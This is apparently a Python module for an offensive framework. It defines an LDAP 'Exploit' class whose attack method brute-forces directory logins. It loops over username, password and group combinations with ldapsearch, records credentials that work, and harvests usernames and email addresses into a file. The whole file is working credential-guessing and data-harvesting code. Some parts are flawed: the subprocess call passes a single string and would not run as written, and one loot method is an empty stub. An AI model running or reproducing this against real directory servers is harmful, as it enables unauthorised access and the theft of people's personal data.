import subprocess
import itertools as it
from hydra import Exploit
class LDAP(Exploit):
    name = "ldap"
    port = 389
    def attack(self, ip_address, usernames, passwords):
        print(f"Running LDAP attack against IP address {ip_address} with usernames {usernames} and passwords {passwords} on domain {self.domain}")
        common_usernames = ['root', 'admin', 'user']
        with open(usernames, 'r') as f:
            provided_usernames = f.read().split()
        usernames = common_usernames + provided_usernames
        with open(passwords, 'r') as f:
            passwords = f.read().split()
        common_groups = ['admins', 'users']
        domainstring = ','.join(['dc='+x for x in self.domain.split('.')])

        captured_usernames = []
        captured_emailids = []
        successful_loot = []

        # sample command: ldapsearch -H ldap://localhost -x -D cn=admin,ou=admins,dc=glauth,dc=com -w dogood -b dc=glauth,dc=com
        for username, password, group in it.product(usernames, passwords, common_groups):
            command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
                      f' -w {password} -b {domainstring}')
            result = subprocess.run(command, capture_output=True, text=True)
            captured_output = result.stdout
            captured_err = result.stderr
            if captured_err or not captured_output:
                continue
            new_usernames, new_emailids = self.process_output(captured_output)
            successful_loot.append((username, password))
            captured_usernames.extend(new_usernames)
            captured_emailids.extend(new_emailids)
        with open('/data/emailids.lst', 'a') as f:
            f.write('\n'.join(captured_emailids) + '\n')
        to_return = successful_loot + [(x, None) for x in captured_usernames]
        print(to_return)

    def process_output(self, output):
        usernames, emailids = [], []
        for line in output.split('\n'):
            if not line:
                continue
            if line.startswith('cn: '):
                usernames.append(line[4:])
            if line.startswith('mail: '):
                emailids.append(line[6:])            
        return usernames, emailids

    def getloot(self, ip_address, credentials):
        pass
